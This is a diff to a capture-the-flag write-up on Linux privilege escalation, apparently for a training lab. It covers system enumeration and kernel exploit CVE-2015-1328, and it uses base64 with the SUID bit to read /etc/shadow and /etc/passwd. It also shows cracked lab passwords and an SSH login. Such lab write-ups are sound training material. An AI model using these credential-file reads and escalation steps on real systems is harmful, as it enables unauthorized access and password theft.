@@ -6,12 +6,16 @@ what is the hostname of the target system
 $ hostname
 $ wade7363
 ```
-What is the linux kernel version of the target system
+What is the linux kernel version of the target system.
+</br>
+The `uname` command gives system information, and with `-r` switch, it gives the kernel release.
 ```
 $ uname -r
 $ 3.13.0.24-generic
 ```
-What Linux is this
+What Linux is this.
+</br>
+we can view the OS name through either `neofetch` or `/etc/os-release`
 ```
 $ cat /etc/os-release
 NAME = "Ubuntu Linux"
@@ -22,8 +26,9 @@ $ python --version
 2.7.6
 ```
 What vulnerability seems to affect the kernel of the target system? (Enter CVE number)
-
-we can search the CVE number on databases like exploit-db
++ Copy the kernel version obtained earlier
++ Search the CVE number on databases like exploit-db by pasting the version + keyword "CVE" on google
++ Download and run the code on the remote machine
 ```
 CVE-2015-1328
 ```
@@ -70,11 +75,12 @@ $ sudo less /etc/shadow
 $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLH
 ```
 ## Pirivlege escalation: SUID
-Finding out packages with SUID set
+SUID is basically a file permission used to read/write/execute files as root, only a specific user has root access to the files
++ Finding out packages with SUID set
 ```
 $ find / -type f -perm -0400 2> /dev/null
 ```
-we can use base64 out of the list 
+we can use base64 because it has the SUID bit
 ```
 $ base64 /etc/shadow | base64 --decode
 $ base64 /etc/passwd | base64 --decode
@@ -90,11 +96,15 @@ test123          (gerryconway)
 Password1        (karen)
 Password1        (user2)
 ```
-+ Which user shares the name of a great comic book writer?
+Which user shares the name of a great comic book writer?
+</br>
 gerryconway
-+ What is the password of user2?
+</br>
+What is the password of user2?
+</br>
 Password1   
-+ What is the content of the flag3.txt file?
+</br>
+What is the content of the flag3.txt file?
 ```
 $ ssh user2@MACHINE_IP
 $ cd /home/Ubuntu
